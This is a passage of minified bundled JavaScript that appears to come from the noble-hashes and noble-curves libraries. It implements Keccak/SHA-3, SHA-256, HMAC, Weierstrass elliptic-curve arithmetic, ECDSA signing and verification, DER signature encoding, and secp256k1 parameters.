r=0;r<50;r+=10)t[e+r]^=a,t[e+r+1]^=u}let e=t[2],n=t[3];for(let r=0;r<24;r++){let i=iB[r],o=iR(e,n,i),s=iC(e,n,i),a=iS[r];e=t[a],n=t[a+1],t[a]=o,t[a+1]=s}for(let e=0;e<50;e+=10){for(let i=0;i<10;i++)r[i]=t[e+i];for(let i=0;i<10;i++)t[e+i]^=~r[(i+2)%10]&r[(i+4)%10]}t[0]^=iO[i],t[1]^=iP[i]}r.fill(0)}class iN extends es.Hash{constructor(t,e,r,i=!1,n=24){if(super(),this.blockLen=t,this.suffix=e,this.outputLen=r,this.enableXOF=i,this.rounds=n,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,(0,et.anumber)(r),0>=this.blockLen||this.blockLen>=200)throw Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=(0,es.u32)(this.state)}keccak(){es.isLE||(0,es.byteSwap32)(this.state32),iU(this.state32,this.rounds),es.isLE||(0,es.byteSwap32)(this.state32),this.posOut=0,this.pos=0}update(t){(0,et.aexists)(this);let{blockLen:e,state:r}=this,i=(t=(0,es.toBytes)(t)).length;for(let n=0;n<i;){let o=Math.min(e-this.pos,i-n);for(let e=0;e<o;e++)r[this.pos++]^=t[n++];this.pos===e&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;let{state:t,suffix:e,pos:r,blockLen:i}=this;t[r]^=e,(128&e)!=0&&r===i-1&&this.keccak(),t[i-1]^=128,this.keccak()}writeInto(t){(0,et.aexists)(this,!1),(0,et.abytes)(t),this.finish();let e=this.state,{blockLen:r}=this;for(let i=0,n=t.length;i<n;){this.posOut>=r&&this.keccak();let o=Math.min(r-this.posOut,n-i);t.set(e.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return t}xofInto(t){if(!this.enableXOF)throw Error("XOF is not possible for this instance");return this.writeInto(t)}xof(t){return(0,et.anumber)(t),this.xofInto(new Uint8Array(t))}digestInto(t){if((0,et.aoutput)(t,this),this.finished)throw Error("digest() was already called");return this.writeInto(t),this.destroy(),t}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(t){let{blockLen:e,suffix:r,outputLen:i,rounds:n,enableXOF:o}=this;return t||(t=new iN(e,r,i,o,n)),t.state32.set(this.state32),t.pos=this.pos,t.posOut=this.posOut,t.finished=this.finished,t.rounds=n,t.suffix=r,t.outputLen=i,t.enableXOF=o,t.destroyed=this.destroyed,t}}r6.Keccak=iN;const iz=(t,e,r)=>(0,es.wrapConstructor)(()=>new iN(e,t,r));r6.sha3_224=iz(6,144,28),r6.sha3_256=iz(6,136,32),r6.sha3_384=iz(6,104,48),r6.sha3_512=iz(6,72,64),r6.keccak_224=iz(1,144,28),r6.keccak_256=iz(1,136,32),r6.keccak_384=iz(1,104,48),r6.keccak_512=iz(1,72,64);const iH=(t,e,r)=>(0,es.wrapXOFConstructorWithOpts)((i={})=>new iN(e,t,void 0===i.dkLen?r:i.dkLen,!0));r6.shake128=iH(31,168,16),r6.shake256=iH(31,136,32);var iq={};Object.defineProperty(iq,"__esModule",{value:!0}),iq.encodeToCurve=iq.hashToCurve=iq.schnorr=iq.secp256k1=void 0;var iW={};Object.defineProperty(iW,"__esModule",{value:!0}),iW.sha224=iW.sha256=iW.SHA256=void 0;const iF=new Uint32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0xfc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x6ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]),iD=new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]),ij=new Uint32Array(64);class iK extends g.HashMD{constructor(){super(64,32,8,!1),this.A=0|iD[0],this.B=0|iD[1],this.C=0|iD[2],this.D=0|iD[3],this.E=0|iD[4],this.F=0|iD[5],this.G=0|iD[6],this.H=0|iD[7]}get(){let{A:t,B:e,C:r,D:i,E:n,F:o,G:s,H:a}=this;return[t,e,r,i,n,o,s,a]}set(t,e,r,i,n,o,s,a){this.A=0|t,this.B=0|e,this.C=0|r,this.D=0|i,this.E=0|n,this.F=0|o,this.G=0|s,this.H=0|a}process(t,e){for(let r=0;r<16;r++,e+=4)ij[r]=t.getUint32(e,!1);for(let t=16;t<64;t++){let e=ij[t-15],r=ij[t-2],i=(0,k.rotr)(e,7)^(0,k.rotr)(e,18)^e>>>3,n=(0,k.rotr)(r,17)^(0,k.rotr)(r,19)^r>>>10;ij[t]=n+ij[t-7]+i+ij[t-16]|0}let{A:r,B:i,C:n,D:o,E:s,F:a,G:u,H:l}=this;for(let t=0;t<64;t++){let e=l+((0,k.rotr)(s,6)^(0,k.rotr)(s,11)^(0,k.rotr)(s,25))+(0,g.Chi)(s,a,u)+iF[t]+ij[t]|0,c=((0,k.rotr)(r,2)^(0,k.rotr)(r,13)^(0,k.rotr)(r,22))+(0,g.Maj)(r,i,n)|0;l=u,u=a,a=s,s=o+e|0,o=n,n=i,i=r,r=e+c|0}r=r+this.A|0,i=i+this.B|0,n=n+this.C|0,o=o+this.D|0,s=s+this.E|0,a=a+this.F|0,u=u+this.G|0,l=l+this.H|0,this.set(r,i,n,o,s,a,u,l)}roundClean(){ij.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}iW.SHA256=iK;class iV extends iK{constructor(){super(),this.A=-0x3efa6128,this.B=0x367cd507,this.C=0x3070dd17,this.D=-0x8f1a6c7,this.E=-4191439,this.F=0x68581511,this.G=0x64f98fa7,this.H=-0x4105b05c,this.outputLen=28}}iW.sha256=(0,k.wrapConstructor)(()=>new iK),iW.sha224=(0,k.wrapConstructor)(()=>new iV);var i$={};Object.defineProperty(i$,"__esModule",{value:!0}),i$.getHash=i4,i$.createCurve=function(t,e){let r=e=>(0,iJ.weierstrass)({...t,...i4(e)});return Object.freeze({...r(e),create:r})};var iZ={};Object.defineProperty(iZ,"__esModule",{value:!0}),iZ.hmac=iZ.HMAC=void 0;class iG extends k.Hash{constructor(t,e){super(),this.finished=!1,this.destroyed=!1,(0,m.ahash)(t);let r=(0,k.toBytes)(e);if(this.iHash=t.create(),"function"!=typeof this.iHash.update)throw Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;let i=this.blockLen,n=new Uint8Array(i);n.set(r.length>i?t.create().update(r).digest():r);for(let t=0;t<n.length;t++)n[t]^=54;this.iHash.update(n),this.oHash=t.create();for(let t=0;t<n.length;t++)n[t]^=106;this.oHash.update(n),n.fill(0)}update(t){return(0,m.aexists)(this),this.iHash.update(t),this}digestInto(t){(0,m.aexists)(this),(0,m.abytes)(t,this.outputLen),this.finished=!0,this.iHash.digestInto(t),this.oHash.update(t),this.oHash.digestInto(t),this.destroy()}digest(){let t=new Uint8Array(this.oHash.outputLen);return this.digestInto(t),t}_cloneInto(t){t||(t=Object.create(Object.getPrototypeOf(this),{}));let{oHash:e,iHash:r,finished:i,destroyed:n,blockLen:o,outputLen:s}=this;return t.finished=i,t.destroyed=n,t.blockLen=o,t.outputLen=s,t.oHash=e._cloneInto(t.oHash),t.iHash=r._cloneInto(t.iHash),t}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}iZ.HMAC=iG,iZ.hmac=(t,e,r)=>new iG(t,e).update(r).digest(),iZ.hmac.create=(t,e)=>new iG(t,e);var iJ={};Object.defineProperty(iJ,"__esModule",{value:!0}),iJ.DER=void 0,iJ.weierstrassPoints=i6,iJ.weierstrass=function(t){let e=function(t){let e=(0,tf.validateBasic)(t);return tp.validateObject(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}(t),{Fp:r,n:i}=e,n=r.BYTES+1,o=2*r.BYTES+1;function s(t){return td.mod(t,i)}function a(t){return td.invert(t,i)}let{ProjectivePoint:u,normPrivateKeyToScalar:l,weierstrassEquation:c,isWithinCurveOrder:h}=i6({...e,toBytes(t,e,i){let n=e.toAffine(),o=r.toBytes(n.x),s=tp.concatBytes;return((0,tp.abool)("isCompressed",i),i)?s(Uint8Array.from([e.hasEvenY()?2:3]),o):s(Uint8Array.from([4]),o,r.toBytes(n.y))},fromBytes(t){let e=t.length,i=t[0],s=t.subarray(1);if(e===n&&(2===i||3===i)){let t;let e=tp.bytesToNumberBE(s);if(!tp.inRange(e,i1,r.ORDER))throw Error("Point is not on curve");let n=c(e);try{t=r.sqrt(n)}catch(t){throw Error("Point is not on curve"+(t instanceof Error?": "+t.message:""))}return(1&i)==1!=((t&i1)===i1)&&(t=r.neg(t)),{x:e,y:t}}if(e===o&&4===i)return{x:r.fromBytes(s.subarray(0,r.BYTES)),y:r.fromBytes(s.subarray(r.BYTES,2*r.BYTES))};throw Error("invalid Point, expected length of "+n+", or uncompressed "+o+", got "+e)}}),f=t=>tp.bytesToHex(tp.numberToBytesBE(t,e.nByteLength)),d=(t,e,r)=>tp.bytesToNumberBE(t.slice(e,r));class p{constructor(t,e,r){this.r=t,this.s=e,this.recovery=r,this.assertValidity()}static fromCompact(t){let r=e.nByteLength;return new p(d(t=(0,tp.ensureBytes)("compactSignature",t,2*r),0,r),d(t,r,2*r))}static fromDER(t){let{r:e,s:r}=iJ.DER.toSig((0,tp.ensureBytes)("DER",t));return new p(e,r)}assertValidity(){tp.aInRange("r",this.r,i1,i),tp.aInRange("s",this.s,i1,i)}addRecoveryBit(t){return new p(this.r,this.s,t)}recoverPublicKey(t){let{r:i,s:n,recovery:o}=this,l=y((0,tp.ensureBytes)("msgHash",t));if(null==o||![0,1,2,3].includes(o))throw Error("recovery id invalid");let c=2===o||3===o?i+e.n:i;if(c>=r.ORDER)throw Error("recovery id 2 or 3 invalid");let h=(1&o)==0?"02":"03",d=u.fromHex(h+f(c)),p=a(c),g=s(-l*p),m=s(n*p),b=u.BASE.multiplyAndAddUnsafe(d,g,m);if(!b)throw Error("point at infinify");return b.assertValidity(),b}hasHighS(){return this.s>i>>i1}normalizeS(){return this.hasHighS()?new p(this.r,s(-this.s),this.recovery):this}toDERRawBytes(){return tp.hexToBytes(this.toDERHex())}toDERHex(){return iJ.DER.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return tp.hexToBytes(this.toCompactHex())}toCompactHex(){return f(this.r)+f(this.s)}}function g(t){let e=tp.isBytes(t),r="string"==typeof t,i=(e||r)&&t.length;return e?i===n||i===o:r?i===2*n||i===2*o:t instanceof u}let m=e.bits2int||function(t){if(t.length>8192)throw Error("input is too large");let r=tp.bytesToNumberBE(t),i=8*t.length-e.nBitLength;return i>0?r>>BigInt(i):r},y=e.bits2int_modN||function(t){return s(m(t))},b=tp.bitMask(e.nBitLength);function w(t){return tp.aInRange("num < 2^"+e.nBitLength,t,i0,b),tp.numberToBytesBE(t,e.nByteLength)}let v={lowS:e.lowS,prehash:!1},x={lowS:e.lowS,prehash:!1};return u.BASE._setWindowSize(8),{CURVE:e,getPublicKey:function(t,e=!0){return u.fromPrivateKey(t).toRawBytes(e)},getSharedSecret:function(t,e,r=!0){if(g(t))throw Error("first arg must be private key");if(!g(e))throw Error("second arg must be public key");return u.fromHex(e).multiply(l(t)).toRawBytes(r)},sign:function(t,n,o=v){let{seed:c,k2sig:f}=function(t,n,o=v){if(["recovered","canonical"].some(t=>t in o))throw Error("sign() legacy options not supported");let{hash:c,randomBytes:f}=e,{lowS:d,prehash:g,extraEntropy:b}=o;null==d&&(d=!0),t=(0,tp.ensureBytes)("msgHash",t),iY(o),g&&(t=(0,tp.ensureBytes)("prehashed msgHash",c(t)));let x=y(t),k=l(n),S=[w(k),w(x)];if(null!=b&&!1!==b){let t=!0===b?f(r.BYTES):b;S.push((0,tp.ensureBytes)("extraEntropy",t))}return{seed:tp.concatBytes(...S),k2sig:function(t){let e=m(t);if(!h(e))return;let r=a(e),n=u.BASE.multiply(e).toAffine(),o=s(n.x);if(o===i0)return;let l=s(r*s(x+o*k));if(l===i0)return;let c=(n.x===o?0:2)|Number(n.y&i1),f=l;if(d&&l>i>>i1)f=l>i>>i1?s(-l):l,c^=1;return new p(o,f,c)}}}(t,n,o);return tp.createHmacDrbg(e.hash.outputLen,e.nByteLength,e.hmac)(c,f)},verify:function(t,r,i,n=x){let o,l;r=(0,tp.ensureBytes)("msgHash",r),i=(0,tp.ensureBytes)("publicKey",i);let{lowS:c,prehash:h,format:f}=n;if(iY(n),"strict"in n)throw Error("options.strict was renamed to lowS");if(void 0!==f&&"compact"!==f&&"der"!==f)throw Error("format must be compact or der");let d="string"==typeof t||tp.isBytes(t),g=!d&&!f&&"object"==typeof t&&null!==t&&"bigint"==typeof t.r&&"bigint"==typeof t.s;if(!d&&!g)throw Error("invalid signature, expected Uint8Array, hex string or Signature instance");try{if(g&&(l=new p(t.r,t.s)),d){try{"compact"!==f&&(l=p.fromDER(t))}catch(t){if(!(t instanceof iJ.DER.Err))throw t}l||"der"===f||(l=p.fromCompact(t))}o=u.fromHex(i)}catch(t){return!1}if(!l||c&&l.hasHighS())return!1;h&&(r=e.hash(r));let{r:m,s:b}=l,w=y(r),v=a(b),k=s(w*v),S=s(m*v),B=u.BASE.multiplyAndAddUnsafe(o,k,S)?.toAffine();return!!B&&s(B.x)===m},ProjectivePoint:u,Signature:p,utils:{isValidPrivateKey(t){try{return l(t),!0}catch(t){return!1}},normPrivateKeyToScalar:l,randomPrivateKey:()=>{let t=td.getMinHashLength(e.n);return td.mapHashToField(e.randomBytes(t),e.n)},precompute:(t=8,e=u.BASE)=>(e._setWindowSize(t),e.multiply(BigInt(3)),e)}}},iJ.SWUFpSqrtRatio=i5,iJ.mapToCurveSimpleSWU=function(t,e){if(td.validateField(t),!t.isValid(e.A)||!t.isValid(e.B)||!t.isValid(e.Z))throw Error("mapToCurveSimpleSWU: invalid opts");let r=i5(t,e.Z);if(!t.isOdd)throw Error("Fp.isOdd is not implemented!");return i=>{let n,o,s,a,u,l,c,h;n=t.sqr(i),n=t.mul(n,e.Z),o=t.sqr(n),o=t.add(o,n),s=t.add(o,t.ONE),s=t.mul(s,e.B),a=t.cmov(e.Z,t.neg(o),!t.eql(o,t.ZERO)),a=t.mul(a,e.A),o=t.sqr(s),l=t.sqr(a),u=t.mul(l,e.A),o=t.add(o,u),o=t.mul(o,s),l=t.mul(l,a),u=t.mul(l,e.B),o=t.add(o,u),c=t.mul(n,s);let{isValid:f,value:d}=r(o,l);h=t.mul(n,i),h=t.mul(h,d),c=t.cmov(c,s,f),h=t.cmov(h,d,f);let p=t.isOdd(i)===t.isOdd(h);return h=t.cmov(t.neg(h),h,p),{x:c=t.div(c,a),y:h}}};var tf=c("lkFCe"),td=c("2D9sF"),tp=(c("esaJO"),c("esaJO"));function iY(t){void 0!==t.lowS&&(0,tp.abool)("lowS",t.lowS),void 0!==t.prehash&&(0,tp.abool)("prehash",t.prehash)}const{bytesToNumberBE:iX,hexToBytes:iQ}=tp;iJ.DER={Err:class extends Error{constructor(t=""){super(t)}},_tlv:{encode:(t,e)=>{let{Err:r}=iJ.DER;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(1&e.length)throw new r("tlv.encode: unpadded data");let i=e.length/2,n=tp.numberToHexUnpadded(i);if(n.length/2&128)throw new r("tlv.encode: long form length too big");let o=i>127?tp.numberToHexUnpadded(n.length/2|128):"";return tp.numberToHexUnpadded(t)+o+n+e},decode(t,e){let{Err:r}=iJ.DER,i=0;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length<2||e[i++]!==t)throw new r("tlv.decode: wrong tlv");let n=e[i++],o=0;if(128&n){let t=127&n;if(!t)throw new r("tlv.decode(long): indefinite length not supported");if(t>4)throw new r("tlv.decode(long): byte length is too big");let s=e.subarray(i,i+t);if(s.length!==t)throw new r("tlv.decode: length bytes not complete");if(0===s[0])throw new r("tlv.decode(long): zero leftmost byte");for(let t of s)o=o<<8|t;if(i+=t,o<128)throw new r("tlv.decode(long): not minimal encoding")}else o=n;let s=e.subarray(i,i+o);if(s.length!==o)throw new r("tlv.decode: wrong value length");return{v:s,l:e.subarray(i+o)}}},_int:{encode(t){let{Err:e}=iJ.DER;if(t<i0)throw new e("integer: negative integers are not allowed");let r=tp.numberToHexUnpadded(t);if(8&Number.parseInt(r[0],16)&&(r="00"+r),1&r.length)throw new e("unexpected DER parsing assertion: unpadded hex");return r},decode(t){let{Err:e}=iJ.DER;if(128&t[0])throw new e("invalid signature integer: negative");if(0===t[0]&&!(128&t[1]))throw new e("invalid signature integer: unnecessary leading zero");return iX(t)}},toSig(t){let{Err:e,_int:r,_tlv:i}=iJ.DER,n="string"==typeof t?iQ(t):t;tp.abytes(n);let{v:o,l:s}=i.decode(48,n);if(s.length)throw new e("invalid signature: left bytes after parsing");let{v:a,l:u}=i.decode(2,o),{v:l,l:c}=i.decode(2,u);if(c.length)throw new e("invalid signature: left bytes after parsing");return{r:r.decode(a),s:r.decode(l)}},hexFromSig(t){let{_tlv:e,_int:r}=iJ.DER,i=e.encode(2,r.encode(t.r)),n=e.encode(2,r.encode(t.s));return e.encode(48,i+n)}};const i0=BigInt(0),i1=BigInt(1),i2=BigInt(2),i3=BigInt(3),i8=BigInt(4);function i6(t){let e=function(t){let e=(0,tf.validateBasic)(t);tp.validateObject(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});let{endo:r,Fp:i,a:n}=e;if(r){if(!i.eql(n,i.ZERO))throw Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if("object"!=typeof r||"bigint"!=typeof r.beta||"function"!=typeof r.splitScalar)throw Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}(t),{Fp:r}=e,i=td.Field(e.n,e.nBitLength),n=e.toBytes||((t,e,i)=>{let n=e.toAffine();return tp.concatBytes(Uint8Array.from([4]),r.toBytes(n.x),r.toBytes(n.y))}),o=e.fromBytes||(t=>{let e=t.subarray(1);return{x:r.fromBytes(e.subarray(0,r.BYTES)),y:r.fromBytes(e.subarray(r.BYTES,2*r.BYTES))}});function s(t){let{a:i,b:n}=e,o=r.sqr(t),s=r.mul(o,t);return r.add(r.add(s,r.mul(t,i)),n)}if(!r.eql(r.sqr(e.Gy),s(e.Gx)))throw Error("bad generator point: equation left != right");function a(t){let r;let{allowedPrivateKeyLengths:i,nByteLength:n,wrapPrivateKey:o,n:s}=e;if(i&&"bigint"!=typeof t){if(tp.isBytes(t)&&(t=tp.bytesToHex(t)),"string"!=typeof t||!i.includes(t.length))throw Error("invalid private key");t=t.padStart(2*n,"0")}try{r="bigint"==typeof t?t:tp.bytesToNumberBE((0,tp.ensureBytes)("private key",t,n))}catch(e){throw Error("invalid private key, expected hex or "+n+" bytes, got "+typeof t)}return o&&(r=td.mod(r,s)),tp.aInRange("private key",r,i1,s),r}function u(t){if(!(t instanceof h))throw Error("ProjectivePoint expected")}let l=(0,tp.memoized)((t,e)=>{let{px:i,py:n,pz:o}=t;if(r.eql(o,r.ONE))return{x:i,y:n};let s=t.is0();null==e&&(e=s?r.ONE:r.inv(o));let a=r.mul(i,e),u=r.mul(n,e),l=r.mul(o,e);if(s)return{x:r.ZERO,y:r.ZERO};if(!r.eql(l,r.ONE))throw Error("invZ was invalid");return{x:a,y:u}}),c=(0,tp.memoized)(t=>{if(t.is0()){if(e.allowInfinityPoint&&!r.is0(t.py))return;throw Error("bad point: ZERO")}let{x:i,y:n}=t.toAffine();if(!r.isValid(i)||!r.isValid(n))throw Error("bad point: x or y not FE");let o=r.sqr(n),a=s(i);if(!r.eql(o,a))throw Error("bad point: equation left != right");if(!t.isTorsionFree())throw Error("bad point: not in prime-order subgroup");return!0});class h{constructor(t,e,i){if(this.px=t,this.py=e,this.pz=i,null==t||!r.isValid(t))throw Error("x required");if(null==e||!r.isValid(e))throw Error("y required");if(null==i||!r.isValid(i))throw Error("z required");Object.freeze(this)}static fromAffine(t){let{x:e,y:i}=t||{};if(!t||!r.isValid(e)||!r.isValid(i))throw Error("invalid affine point");if(t instanceof h)throw Error("projective point not allowed");let n=t=>r.eql(t,r.ZERO);return n(e)&&n(i)?h.ZERO:new h(e,i,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(t){let e=r.invertBatch(t.map(t=>t.pz));return t.map((t,r)=>t.toAffine(e[r])).map(h.fromAffine)}static fromHex(t){let e=h.fromAffine(o((0,tp.ensureBytes)("pointHex",t)));return e.assertValidity(),e}static fromPrivateKey(t){return h.BASE.multiply(a(t))}static msm(t,e){return(0,tf.pippenger)(h,i,t,e)}_setWindowSize(t){d.setWindowSize(this,t)}assertValidity(){c(this)}hasEvenY(){let{y:t}=this.toAffine();if(r.isOdd)return!r.isOdd(t);throw Error("Field doesn't support isOdd")}equals(t){u(t);let{px:e,py:i,pz:n}=this,{px:o,py:s,pz:a}=t,l=r.eql(r.mul(e,a),r.mul(o,n)),c=r.eql(r.mul(i,a),r.mul(s,n));return l&&c}negate(){return new h(this.px,r.neg(this.py),this.pz)}double(){let{a:t,b:i}=e,n=r.mul(i,i3),{px:o,py:s,pz:a}=this,u=r.ZERO,l=r.ZERO,c=r.ZERO,f=r.mul(o,o),d=r.mul(s,s),p=r.mul(a,a),g=r.mul(o,s);return g=r.add(g,g),c=r.mul(o,a),c=r.add(c,c),u=r.mul(t,c),l=r.mul(n,p),l=r.add(u,l),u=r.sub(d,l),l=r.add(d,l),l=r.mul(u,l),u=r.mul(g,u),c=r.mul(n,c),p=r.mul(t,p),g=r.sub(f,p),g=r.mul(t,g),g=r.add(g,c),c=r.add(f,f),f=r.add(c,f),f=r.add(f,p),f=r.mul(f,g),l=r.add(l,f),p=r.mul(s,a),p=r.add(p,p),f=r.mul(p,g),u=r.sub(u,f),c=r.mul(p,d),c=r.add(c,c),new h(u,l,c=r.add(c,c))}add(t){u(t);let{px:i,py:n,pz:o}=this,{px:s,py:a,pz:l}=t,c=r.ZERO,f=r.ZERO,d=r.ZERO,p=e.a,g=r.mul(e.b,i3),m=r.mul(i,s),y=r.mul(n,a),b=r.mul(o,l),w=r.add(i,n),v=r.add(s,a);w=r.mul(w,v),v=r.add(m,y),w=r.sub(w,v),v=r.add(i,o);let x=r.add(s,l);return v=r.mul(v,x),x=r.add(m,b),v=r.sub(v,x),x=r.add(n,o),c=r.add(a,l),x=r.mul(x,c),c=r.add(y,b),x=r.sub(x,c),d=r.mul(p,v),c=r.mul(g,b),d=r.add(c,d),c=r.sub(y,d),d=r.add(y,d),f=r.mul(c,d),y=r.add(m,m),y=r.add(y,m),b=r.mul(p,b),v=r.mul(g,v),y=r.add(y,b),b=r.sub(m,b),b=r.mul(p,b),v=r.add(v,b),m=r.mul(y,v),f=r.add(f,m),m=r.mul(x,v),c=r.mul(w,c),c=r.sub(c,m),m=r.mul(w,y),d=r.mul(x,d),new h(c,f,d=r.add(d,m))}subtract(t){return this.add(t.negate())}is0(){return this.equals(h.ZERO)}wNAF(t){return d.wNAFCached(this,t,h.normalizeZ)}multiplyUnsafe(t){let{endo:i,n:n}=e;tp.aInRange("scalar",t,i0,n);let o=h.ZERO;if(t===i0)return o;if(this.is0()||t===i1)return this;if(!i||d.hasPrecomputes(this))return d.wNAFCachedUnsafe(this,t,h.normalizeZ);let{k1neg:s,k1:a,k2neg:u,k2:l}=i.splitScalar(t),c=o,f=o,p=this;for(;a>i0||l>i0;)a&i1&&(c=c.add(p)),l&i1&&(f=f.add(p)),p=p.double(),a>>=i1,l>>=i1;return s&&(c=c.negate()),u&&(f=f.negate()),f=new h(r.mul(f.px,i.beta),f.py,f.pz),c.add(f)}multiply(t){let i,n;let{endo:o,n:s}=e;if(tp.aInRange("scalar",t,i1,s),o){let{k1neg:e,k1:s,k2neg:a,k2:u}=o.splitScalar(t),{p:l,f:c}=this.wNAF(s),{p:f,f:p}=this.wNAF(u);l=d.constTimeNegate(e,l),f=d.constTimeNegate(a,f),f=new h(r.mul(f.px,o.beta),f.py,f.pz),i=l.add(f),n=c.add(p)}else{let{p:e,f:r}=this.wNAF(t);i=e,n=r}return h.normalizeZ([i,n])[0]}multiplyAndAddUnsafe(t,e,r){let i=h.BASE,n=(t,e)=>e!==i0&&e!==i1&&t.equals(i)?t.multiply(e):t.multiplyUnsafe(e),o=n(this,e).add(n(t,r));return o.is0()?void 0:o}toAffine(t){return l(this,t)}isTorsionFree(){let{h:t,isTorsionFree:r}=e;if(t===i1)return!0;if(r)return r(h,this);throw Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){let{h:t,clearCofactor:r}=e;return t===i1?this:r?r(h,this):this.multiplyUnsafe(e.h)}toRawBytes(t=!0){return(0,tp.abool)("isCompressed",t),this.assertValidity(),n(h,this,t)}toHex(t=!0){return(0,tp.abool)("isCompressed",t),tp.bytesToHex(this.toRawBytes(t))}}h.BASE=new h(e.Gx,e.Gy,r.ONE),h.ZERO=new h(r.ZERO,r.ONE,r.ZERO);let f=e.nBitLength,d=(0,tf.wNAF)(h,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:h,normPrivateKeyToScalar:a,weierstrassEquation:s,isWithinCurveOrder:function(t){return tp.inRange(t,i1,e.n)}}}function i5(t,e){let r=t.ORDER,i=i0;for(let t=r-i1;t%i2===i0;t/=i2)i+=i1;let n=i,o=i2<<n-i1-i1,s=o*i2,a=(r-i1)/s,u=(a-i1)/i2,l=s-i1,c=t.pow(e,a),h=t.pow(e,(a+i1)/i2),f=(e,r)=>{let i=c,s=t.pow(r,l),a=t.sqr(s);a=t.mul(a,r);let f=t.mul(e,a);f=t.pow(f,u),f=t.mul(f,s),s=t.mul(f,r),a=t.mul(f,e);let d=t.mul(a,s);f=t.pow(d,o);let p=t.eql(f,t.ONE);s=t.mul(a,h),f=t.mul(d,i),a=t.cmov(s,a,p),d=t.cmov(f,d,p);for(let e=n;e>i1;e--){let r=e-i2;r=i2<<r-i1;let n=t.pow(d,r),o=t.eql(n,t.ONE);s=t.mul(a,i),i=t.mul(i,i),n=t.mul(d,i),a=t.cmov(s,a,o),d=t.cmov(n,d,o)}return{isValid:p,value:a}};if(t.ORDER%i8===i3){let r=(t.ORDER-i3)/i8,i=t.sqrt(t.neg(e));f=(e,n)=>{let o=t.sqr(n),s=t.mul(e,n);o=t.mul(o,s);let a=t.pow(o,r);a=t.mul(a,s);let u=t.mul(a,i),l=t.mul(t.sqr(a),n),c=t.eql(l,e),h=t.cmov(u,a,c);return{isValid:c,value:h}}}return f}function i4(t){return{hash:t,hmac:(e,...r)=>(0,iZ.hmac)(t,e,(0,k.concatBytes)(...r)),randomBytes:k.randomBytes}}var td=c("2D9sF"),tp=c("esaJO");const i9=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),i7=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),nt=BigInt(1),ne=BigInt(2),nr=(t,e)=>(t+e/ne)/e;function ni(t){let e=BigInt(3),r=BigInt(6),i=BigInt(11),n=BigInt(22),o=BigInt(23),s=BigInt(44),a=BigInt(88),u=t*t*t%i9,l=u*u*t%i9,c=(0,td.pow2)(l,e,i9)*l%i9,h=(0,td.pow2)(c,e,i9)*l%i9,f=(0,td.pow2)(h,ne,i9)*u%i9,d=(0,td.pow2)(f,i,i9)*f%i9,p=(0,td.pow2)(d,n,i9)*d%i9,g=(0,td.pow2)(p,s,i9)*p%i9,m=(0,td.pow2)(g,a,i9)*g%i9,y=(0,td.pow2)(m,s,i9)*p%i9,b=(0,td.pow2)(y,e,i9)*l%i9,w=(0,td.pow2)(b,o,i9)*d%i9,v=(0,td.pow2)(w,r,i9)*u%i9,x=(0,td.pow2)(v,ne,i9);if(!nn.eql(nn.sqr(x),t))throw Error("Cannot find square root");return x}const nn=(0,td.Field)(i9,void 0,void 0,{sqrt:ni});iq.secp256k1=(0,i$.createCurve)({a:BigInt(0),b:BigInt(7),Fp:nn,n:i7,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{let 